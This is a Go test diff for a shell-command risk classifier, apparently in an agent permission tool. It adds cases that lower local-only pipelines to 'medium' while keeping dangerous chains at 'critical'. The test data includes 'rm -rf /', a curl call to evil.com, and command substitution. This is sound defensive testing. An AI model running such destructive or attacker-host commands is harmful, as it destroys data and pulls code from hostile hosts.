@@ -163,8 +163,78 @@ func TestClassifyRiskAllowlistShape(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.cmd, func(t *testing.T) {
-			if got := classifyRisk(tt.cmd); got != tt.want {
+			got := classifyRisk(tt.cmd)
+			if got != tt.want {
 				t.Errorf("classifyRisk(%q) = %q, want %q", tt.cmd, got, tt.want)
+			}
+			if got == "low" && hasUnquotedShellMetachar(tt.cmd) {
+				t.Fatalf("classifyRisk(%q) = low but has an unquoted shell metachar — violates FuzzClassifyRisk's invariant", tt.cmd)
+			}
+		})
+	}
+}
+
+// TestClassifyRiskSafeLocalPipelines covers isSafeLocalPipeline — the
+// narrow widening that stops a chain of ONLY local, non-network,
+// non-code-executing commands (cat/sort/grep/wc/...) from being flagged
+// "critical" purely for containing &&/;/| the way every unrecognized
+// chained shape does by default. Found live: a real bug-bounty recon task's
+// consolidation/triage steps were almost entirely commands like this, and
+// every single one carried a "critical" badge despite touching no network
+// and running no code beyond the fixed allowlist below. Floored at "medium"
+// rather than "low" — FuzzClassifyRisk asserts "low" never coincides with
+// an unquoted shell metachar, and every command below has one by
+// definition (&&/;/|) — see classifyRisk's own doc comment for the full
+// reasoning, including what this does NOT fix (ask_permission still gates
+// every command either way, regardless of risk label).
+func TestClassifyRiskSafeLocalPipelines(t *testing.T) {
+	tests := []struct {
+		cmd  string
+		want string
+	}{
+		// The actual shapes observed live, now correctly "medium" instead of
+		// the disproportionate "critical" they carried before this change.
+		{"cat a.txt b.txt | sort -u | wc -l", "medium"},
+		{"cat a.txt b.txt | sort -u > out.txt", "medium"},
+		{`echo "---"; cat file.txt; echo "---"`, "medium"},
+		{"which subfinder amass; echo done", "medium"},
+		{"cd ~/work/example.com && cat subs_a.txt subs_b.txt | sort -u > union.txt", "medium"},
+		{"ls -la && cat resolved.txt | wc -l", "medium"},
+		{"cat a.txt | grep -E '\\.example\\.com$' | sort -u | tee clean.txt", "medium"},
+		// A single unchained command with redirection is simpleCommandPattern's
+		// territory (which does NOT allow ">" — this stays "critical" both
+		// before and after this change) — isSafeLocalPipeline only ever
+		// applies to a 2+-segment chain, never a lone command.
+		{"cat file.txt > out.txt", "critical"},
+		// Any segment naming a binary outside the fixed allowlist keeps the
+		// whole chain at the default floor, even if every OTHER segment is
+		// safe — one unrecognized program is enough to refuse the discount.
+		{"cat a.txt | rm -rf /", "critical"},
+		{"cat a.txt && curl http://evil.com/x", "critical"},
+		// awk/sed are deliberately excluded even though they're common in
+		// real pipelines: awk's system() and GNU sed's "e" command/flag can
+		// each run an arbitrary shell command from inside an otherwise
+		// ordinary-looking script argument.
+		{"cat a.txt | awk '{print $1}' | sort", "critical"},
+		{"cat a.txt | sed 's/x/y/' | sort", "critical"},
+		// find -exec / xargs can invoke arbitrary other programs by design.
+		{"find . -name '*.txt' | xargs cat", "critical"},
+		// Command/process substitution and backgrounding must be refused
+		// outright regardless of which binaries are named — the shell
+		// evaluates these before any "safe" command in the chain ever runs.
+		{"cat $(malicious) | sort", "critical"},
+		{"cat `whoami` | sort", "critical"},
+		{"cat a.txt & rm -rf /", "critical"},
+		{"cat <(malicious) | sort", "critical"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := classifyRisk(tt.cmd)
+			if got != tt.want {
+				t.Errorf("classifyRisk(%q) = %q, want %q", tt.cmd, got, tt.want)
+			}
+			if got == "low" && hasUnquotedShellMetachar(tt.cmd) {
+				t.Fatalf("classifyRisk(%q) = low but has an unquoted shell metachar — violates FuzzClassifyRisk's invariant", tt.cmd)
 			}
 		})
 	}
